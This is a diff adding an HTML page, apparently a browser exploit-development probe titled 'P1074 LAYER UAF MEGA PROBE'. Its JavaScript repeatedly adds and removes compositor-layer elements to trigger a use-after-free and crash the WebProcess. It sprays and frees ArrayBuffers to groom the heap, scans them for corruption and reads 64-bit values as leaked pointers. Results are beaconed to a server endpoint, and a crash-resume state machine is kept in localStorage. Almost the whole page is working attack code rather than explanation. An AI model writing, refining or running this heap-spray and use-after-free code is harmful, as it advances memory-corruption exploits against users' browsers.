@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>P1074</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px;overflow-y:auto}
+.hud{border:1px solid #1a3a1a;border-radius:4px;margin-bottom:6px;padding:6px;background:#0d1117}
+.title{color:#00ff88;font-size:13px;font-weight:bold;margin-bottom:4px}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}
+.sep{border-top:1px solid #1a3a1a;margin:4px 0}
+#arena{position:fixed;top:-9999px;left:-9999px;width:2000px;height:2000px;overflow:hidden}
+</style>
+</head>
+<body>
+<div class="hud">
+<div class="title">P1074 — LAYER UAF MEGA PROBE</div>
+<div class="info">Combined isolation + timing + spray + reclaim</div>
+</div>
+<div id="log"></div>
+<div id="arena"></div>
+
+<script>
+var L=document.getElementById('log'),A=document.getElementById('arena');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function B(t,d){var m=String(d||'');log('info','[B] P1074-'+t+' | '+m);try{var u='/beacon.php?tag=P1074-'+encodeURIComponent(t);if(m)u+='&data='+encodeURIComponent(m.slice(0,900));u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+function sl(ms){return new Promise(function(r){setTimeout(r,ms)})}
+function h8(v){return('0'+v.toString(16)).slice(-2)}
+
+// Helper: run a crash-variant test with a configurable cycle count
+// Returns 'survived' or doesn't return (crash)
+async function crashTest(name, cycles, createStyle, removeFn) {
+  B('PRE-'+name, 'cycles:'+cycles);
+  var c = document.createElement('div');
+  A.appendChild(c);
+  var count = 0;
+  var obs = new MutationObserver(function(muts) {
+    for (var i=0;i<muts.length;i++)
+      for (var j=0;j<muts[i].addedNodes.length;j++) {
+        var n=muts[i].addedNodes[j];
+        if(n.nodeType===1) removeFn(c, n);
+      }
+  });
+  obs.observe(c, {childList:true});
+  for (var i=0;i<cycles;i++) {
+    var el=document.createElement('div');
+    el.style.cssText=createStyle;
+    c.appendChild(el);
+    count++;
+    await sl(2);
+  }
+  await sl(100);
+  obs.disconnect();
+  try{A.removeChild(c)}catch(e){}
+  B('POST-'+name, 'survived:'+count);
+  return 'survived';
+}
+
+// ============================================================
+// SECTION A: ISOLATION (safe first, crash-prone last)
+// ============================================================
+async function sectionA() {
+  log('warn','=== A: ISOLATION ===');
+
+  // A1: No MutObs, no will-change (baseline)
+  B('PRE-A1','baseline');
+  var c=document.createElement('div');A.appendChild(c);
+  for(var i=0;i<30;i++){var e=document.createElement('div');e.style.cssText='width:50px;height:50px';c.appendChild(e);await sl(1);c.removeChild(e);await sl(1)}
+  A.removeChild(c);
+  B('POST-A1','survived:30');
+  log('ok','[A1] baseline survived');
+
+  // A2: MutObs + no will-change + RAF remove
+  await crashTest('A2', 30, 'width:50px;height:50px;background:blue',
+    function(c,n){requestAnimationFrame(function(){try{c.removeChild(n)}catch(e){}})});
+  log('ok','[A2] MutObs + no-layer + RAF survived');
+
+  // A3: will-change + no MutObs (direct add/remove)
+  B('PRE-A3','no-mutobs');
+  var c2=document.createElement('div');A.appendChild(c2);
+  for(var i=0;i<30;i++){var e=document.createElement('div');e.style.cssText='width:50px;height:50px;will-change:transform;transform:translateZ(0)';c2.appendChild(e);await sl(1);c2.removeChild(e);await sl(1)}
+  A.removeChild(c2);
+  B('POST-A3','survived:30');
+  log('ok','[A3] will-change + no MutObs survived');
+
+  // A4: Full pattern but sync remove (MutObs removes in same microtask)
+  await crashTest('A4', 30, 'width:50px;height:50px;will-change:transform;transform:translateZ(0)',
+    function(c,n){try{c.removeChild(n)}catch(e){}});
+  log('ok','[A4] sync remove survived');
+
+  // A5: Full pattern but setTimeout(0) remove
+  await crashTest('A5', 30, 'width:50px;height:50px;will-change:transform;transform:translateZ(0)',
+    function(c,n){setTimeout(function(){try{c.removeChild(n)}catch(e){}},0)});
+  log('ok','[A5] setTimeout(0) remove survived');
+
+  // A6: Full pattern but Promise.resolve microtask remove
+  await crashTest('A6', 30, 'width:50px;height:50px;will-change:transform;transform:translateZ(0)',
+    function(c,n){Promise.resolve().then(function(){try{c.removeChild(n)}catch(e){}})});
+  log('ok','[A6] microtask remove survived');
+
+  // A7: Double-RAF remove
+  await crashTest('A7', 30, 'width:50px;height:50px;will-change:transform;transform:translateZ(0)',
+    function(c,n){requestAnimationFrame(function(){requestAnimationFrame(function(){try{c.removeChild(n)}catch(e){}})})});
+  log('ok','[A7] double-RAF remove survived');
+
+  // A8: will-change:opacity (not transform)
+  await crashTest('A8', 30, 'width:50px;height:50px;will-change:opacity;opacity:0.99',
+    function(c,n){requestAnimationFrame(function(){try{c.removeChild(n)}catch(e){}})});
+  log('ok','[A8] will-change:opacity + RAF survived');
+
+  // A9: CSS animation + will-change
+  var st=document.createElement('style');st.textContent='@keyframes p1074sp{from{transform:rotate(0)}to{transform:rotate(360deg)}}';document.head.appendChild(st);
+  await crashTest('A9', 30, 'width:50px;height:50px;will-change:transform;animation:p1074sp .1s linear infinite',
+    function(c,n){requestAnimationFrame(function(){try{c.removeChild(n)}catch(e){}})});
+  document.head.removeChild(st);
+  log('ok','[A9] CSS animation + RAF survived');
+
+  // A10: position:fixed (forced compositing)
+  await crashTest('A10', 30, 'width:50px;height:50px;position:fixed;top:0;left:0',
+    function(c,n){requestAnimationFrame(function(){try{c.removeChild(n)}catch(e){}})});
+  log('ok','[A10] position:fixed + RAF survived');
+}
+
+// ============================================================
+// SECTION B: SPRAY + SINGLE RAF SHOT
+// Spray ABs, trigger ONE RAF UAF, scan for corruption
+// ============================================================
+async function sectionB() {
+  log('warn','=== B: SPRAY + SINGLE RAF SHOT ===');
+  B('PRE-B','starting');
+
+  var SIZES=[128,192,256,320,384,448,512,640,768];
+  var N=200;
+  var spray={},views={};
+
+  // Spray
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];spray[sz]=[];views[sz]=[];
+    for(var i=0;i<N;i++){
+      var ab=new ArrayBuffer(sz),v=new Uint8Array(ab);
+      v[0]=si;v[1]=i&0xFF;v[2]=(i>>8)&0xFF;
+      for(var j=3;j<sz;j++)v[j]=0x41;
+      spray[sz].push(ab);views[sz].push(v);
+    }
+  }
+  log('ok','[B1] Sprayed '+SIZES.length*N+' ABs');
+
+  // Create holes (free even indices)
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var i=0;i<N;i+=2){spray[sz][i]=null;views[sz][i]=null}
+  }
+  for(var gc=0;gc<20;gc++){var t=new ArrayBuffer(65536);t=null}
+  await sl(30);
+  log('ok','[B2] Holes created');
+
+  // Create compositor layers that fill holes
+  var c=document.createElement('div');c.style.position='relative';A.appendChild(c);
+  var layerEls=[];
+  for(var i=0;i<30;i++){
+    var el=document.createElement('div');
+    el.style.cssText='position:absolute;width:10px;height:10px;will-change:transform;transform:translateZ(0);left:'+(i*3)+'px';
+    c.appendChild(el);layerEls.push(el);
+  }
+  c.offsetHeight;
+  await sl(30);
+  log('ok','[B3] 30 compositor layers created');
+
+  // Single-shot RAF UAF with IN-RAF spray
+  var uafC=document.createElement('div');A.appendChild(uafC);
+  var triggered=false;
+  var obs=new MutationObserver(function(muts){
+    for(var i=0;i<muts.length;i++)
+      for(var j=0;j<muts[i].addedNodes.length;j++){
+        var n=muts[i].addedNodes[j];
+        if(n.nodeType===1){
+          requestAnimationFrame(function(){
+            try{uafC.removeChild(n)}catch(e){}
+            triggered=true;
+            // In-RAF spray to fill freed compositor memory
+            for(var si=0;si<SIZES.length;si++){
+              var sz=SIZES[si];
+              for(var k=0;k<30;k++){
+                var ab=new ArrayBuffer(sz),v=new Uint8Array(ab);
+                for(var j2=0;j2<sz;j2++)v[j2]=0xDD;
+                spray[sz].push(ab);views[sz].push(v);
+              }
+            }
+          });
+        }
+      }
+  });
+  obs.observe(uafC,{childList:true});
+
+  // Only 3 trigger cycles (minimal to reduce crash risk)
+  for(var i=0;i<3;i++){
+    var el=document.createElement('div');
+    el.style.cssText='width:50px;height:50px;will-change:transform;transform:translateZ(0)';
+    uafC.appendChild(el);
+    await sl(10);
+  }
+  await sl(150);
+  obs.disconnect();
+  try{A.removeChild(uafC)}catch(e){}
+  B('B4-TRIGGERED','triggered:'+triggered);
+
+  // Scan pre-spray
+  var corrupt=[],scanned=0;
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var i=1;i<N;i+=2){
+      var v=views[sz][i];if(!v)continue;scanned++;
+      for(var j=3;j<sz;j++){
+        if(v[j]!==0x41){
+          var hex='';for(var k=0;k<Math.min(64,sz);k++)hex+=h8(v[k]);
+          corrupt.push({sz:sz,idx:i,off:j,val:v[j],hex:hex});break;
+        }
+      }
+    }
+  }
+
+  // Scan post-spray (0xDD buffers)
+  var postC=[];
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var i=N;i<spray[sz].length;i++){
+      var v=views[sz][i];if(!v)continue;
+      for(var j=0;j<sz;j++){
+        if(v[j]!==0xDD){
+          var hex='';for(var k=0;k<Math.min(64,sz);k++)hex+=h8(v[k]);
+          postC.push({sz:sz,idx:i,off:j,val:v[j],hex:hex});break;
+        }
+      }
+    }
+  }
+
+  var msg='scanned:'+scanned+'|preC:'+corrupt.length+'|postC:'+postC.length;
+  if(corrupt.length>0)msg+='|HIT:sz='+corrupt[0].sz+',off='+corrupt[0].off+',val=0x'+corrupt[0].val.toString(16)+',hex='+corrupt[0].hex.substring(0,32);
+  if(postC.length>0)msg+='|PHIT:sz='+postC[0].sz+',off='+postC[0].off;
+  B('B5-SCAN',msg);
+
+  if(corrupt.length>0||postC.length>0){
+    log('ok','*** CORRUPTION FOUND! ***');
+    var all=corrupt.concat(postC);
+    for(var i=0;i<Math.min(all.length,5);i++){
+      var x=all[i];
+      log('ok','  sz='+x.sz+' idx='+x.idx+' off='+x.off+' hex='+x.hex.substring(0,40));
+      B('B-HIT-'+i,'sz:'+x.sz+'|off:'+x.off+'|hex:'+x.hex);
+      // BigUint64Array read
+      var ab2=(i<corrupt.length)?spray[x.sz][x.idx]:spray[x.sz][x.idx];
+      if(ab2){try{
+        var bv=new BigUint64Array(ab2);
+        var ptrs='';for(var p=0;p<Math.min(bv.length,8);p++)ptrs+=p+':0x'+bv[p].toString(16)+'|';
+        B('B-PTR-'+i,ptrs);log('ok','  ptrs:'+ptrs.substring(0,200));
+      }catch(e){}}
+    }
+    return true;
+  }
+  log('warn','[B5] No corruption in '+scanned+' buffers');
+
+  // Cleanup
+  for(var i=0;i<layerEls.length;i++){try{c.removeChild(layerEls[i])}catch(e){}}
+  try{A.removeChild(c)}catch(e){}
+  return false;
+}
+
+// ============================================================
+// SECTION C: AGGRESSIVE 20-CYCLE WITH WIDER SPRAY
+// If B's 3 cycles didn't crash, try 20 with full-width spray
+// ============================================================
+async function sectionC() {
+  log('warn','=== C: AGGRESSIVE 20-CYCLE ===');
+  B('PRE-C','20cycles');
+
+  var SIZES=[64,128,192,256,320,384,448,512,576,640,704,768];
+  var N=100;
+  var spray={},views={};
+
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];spray[sz]=[];views[sz]=[];
+    for(var i=0;i<N;i++){
+      var ab=new ArrayBuffer(sz),v=new Uint8Array(ab);
+      for(var j=0;j<sz;j++)v[j]=0x41;
+      spray[sz].push(ab);views[sz].push(v);
+    }
+  }
+  for(var si=0;si<SIZES.length;si++){var sz=SIZES[si];for(var i=0;i<N;i+=2){spray[sz][i]=null;views[sz][i]=null}}
+  for(var gc=0;gc<15;gc++){var t=new ArrayBuffer(65536);t=null}
+  await sl(20);
+
+  // 20-cycle trigger
+  var c=document.createElement('div');A.appendChild(c);
+  var obs=new MutationObserver(function(muts){
+    for(var i=0;i<muts.length;i++)
+      for(var j=0;j<muts[i].addedNodes.length;j++){
+        var n=muts[i].addedNodes[j];
+        if(n.nodeType===1)requestAnimationFrame(function(){
+          try{c.removeChild(n)}catch(e){}
+          // In-RAF spray
+          for(var si=0;si<SIZES.length;si++){var sz=SIZES[si];
+            for(var k=0;k<20;k++){var ab=new ArrayBuffer(sz),v=new Uint8Array(ab);for(var j2=0;j2<sz;j2++)v[j2]=0xCC;spray[sz].push(ab);views[sz].push(v)}}
+        });
+      }
+  });
+  obs.observe(c,{childList:true});
+
+  for(var i=0;i<20;i++){
+    var el=document.createElement('div');
+    el.style.cssText='width:50px;height:50px;will-change:transform;transform:translateZ(0)';
+    c.appendChild(el);
+    await sl(2);
+  }
+  await sl(200);
+  obs.disconnect();
+  try{A.removeChild(c)}catch(e){}
+
+  // Scan
+  var corrupt=[], scanned=0;
+  for(var si=0;si<SIZES.length;si++){var sz=SIZES[si];
+    for(var i=1;i<N;i+=2){var v=views[sz][i];if(!v)continue;scanned++;
+      for(var j=0;j<sz;j++){if(v[j]!==0x41){
+        var hex='';for(var k=0;k<Math.min(64,sz);k++)hex+=h8(v[k]);
+        corrupt.push({sz:sz,idx:i,off:j,val:v[j],hex:hex});break;
+      }}
+    }
+  }
+
+  var msg='scanned:'+scanned+'|corrupt:'+corrupt.length;
+  if(corrupt.length>0)msg+='|sz='+corrupt[0].sz+',off='+corrupt[0].off+',hex='+corrupt[0].hex.substring(0,32);
+  B('C-SCAN',msg);
+
+  if(corrupt.length>0){
+    log('ok','*** C: CORRUPTION! ***');
+    for(var i=0;i<Math.min(corrupt.length,3);i++){
+      B('C-HIT-'+i,'sz:'+corrupt[i].sz+'|off:'+corrupt[i].off+'|hex:'+corrupt[i].hex);
+      // BigUint64 read
+      var ab=spray[corrupt[i].sz]?spray[corrupt[i].sz][corrupt[i].idx]:null;
+      if(ab)try{var bv=new BigUint64Array(ab);var p='';for(var j=0;j<Math.min(8,bv.length);j++)p+=j+':0x'+bv[j].toString(16)+'|';B('C-PTR-'+i,p)}catch(e){}
+    }
+    return true;
+  }
+  log('warn','[C] No corruption in 20-cycle attempt');
+  return false;
+}
+
+// ============================================================
+// SECTION D: FINALIZER TIMING
+// ============================================================
+async function sectionD() {
+  log('warn','=== D: FINALIZER TIMING ===');
+  B('PRE-D','starting');
+
+  var freed=false, freeTime=0;
+  var reg=new FinalizationRegistry(function(lbl){
+    freed=true;freeTime=Date.now();
+    B('D-FREE',lbl+'|t:'+freeTime);
+  });
+
+  var c=document.createElement('div');A.appendChild(c);
+  (function(){
+    var el=document.createElement('div');
+    el.style.cssText='width:100px;height:100px;will-change:transform;transform:translateZ(0)';
+    c.appendChild(el);c.offsetHeight;
+    reg.register(el,'comp-layer');
+    c.removeChild(el);
+  })();
+
+  for(var gc=0;gc<100;gc++){var t=new ArrayBuffer(65536);t=null;if(gc%20===0)await sl(10)}
+  await sl(300);
+
+  B('D-RESULT','freed:'+freed);
+  log(freed?'ok':'warn','[D] Compositor element '+(freed?'COLLECTED':'not collected'));
+  try{A.removeChild(c)}catch(e){}
+}
+
+// ============================================================
+// SECTION E: FULL CRASH CONFIRM (LAST)
+// ============================================================
+async function sectionE() {
+  log('warn','=== E: CRASH CONFIRM (40 cycles) ===');
+  log('fail','This WILL crash WebProcess');
+  B('PRE-E-CRASH','40-cycles');
+
+  await crashTest('E', 40, 'width:50px;height:50px;will-change:transform;transform:translateZ(0)',
+    function(c,n){requestAnimationFrame(function(){try{c.removeChild(n)}catch(e){}})});
+
+  // If we get here, no crash (unexpected based on P1070 results)
+  B('POST-E-NO-CRASH','survived-40');
+  log('fail','[E] Expected crash but survived 40 cycles!');
+}
+
+// ============================================================
+// MAIN
+// ============================================================
+async function run() {
+  /* Crash-resume state machine: p1074_sec = next section (0=A..4=E, 5=done).
+     Pre-advance before each risky section; a crash marks it CRASHED on next boot. */
+  var sec=0, res={};
+  try{sec=parseInt(localStorage.getItem('p1074_sec')||'0');}catch(e){}
+  try{var r=localStorage.getItem('p1074_res');if(r)res=JSON.parse(r);}catch(e){}
+  if(sec>0&&sec<5&&!res['S'+(sec-1)]){res['S'+(sec-1)]='CRASHED';}
+  function save(){try{localStorage.setItem('p1074_sec',''+sec);
+    localStorage.setItem('p1074_res',JSON.stringify(res));}catch(e){}}
+  function preAdvance(n){try{localStorage.setItem('p1074_sec',''+n);}catch(e){}}
+
+  B('BOOT','sec='+sec+'|prev='+JSON.stringify(res).slice(0,300));
+  log('ok','=== P1074 LAYER UAF MEGA PROBE (sec='+sec+') ===');
+
+  if(sec===0){
+    preAdvance(1);
+    await sectionA();res.S0='done';sec=1;save();
+    log('ok','');log('warn','--- A complete, starting B ---');await sl(200);
+  }
+  if(sec===1){
+    preAdvance(2);
+    res.S1='B:'+(await sectionB());sec=2;save();
+    log('ok','');log('warn','--- B complete, starting C ---');await sl(200);
+  }
+  if(sec===2){
+    preAdvance(3);
+    res.S2='C:'+(await sectionC());sec=3;save();
+    log('ok','');log('warn','--- C complete, starting D ---');await sl(200);
+  }
+  if(sec===3){
+    preAdvance(4);
+    await sectionD();res.S3='done';sec=4;save();
+    log('ok','');log('warn','--- D complete, starting E (CRASH) ---');await sl(200);
+  }
+  if(sec===4){
+    preAdvance(5);
+    await sectionE();
+    res.S4='E:no-crash';sec=5;save();
+  }
+
+  B('DONE',JSON.stringify(res).slice(0,800));
+  log('ok','=== P1074 COMPLETE ===');
+  try{localStorage.setItem('p1074_sec','0');localStorage.removeItem('p1074_res');}catch(e){}
+}
+
+run();
+
+/* auto-reload check: poll /reload.txt, reload when the token changes */
+(function(){
+  var cur='P1074-layer-uaf-mega';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body>
+</html>
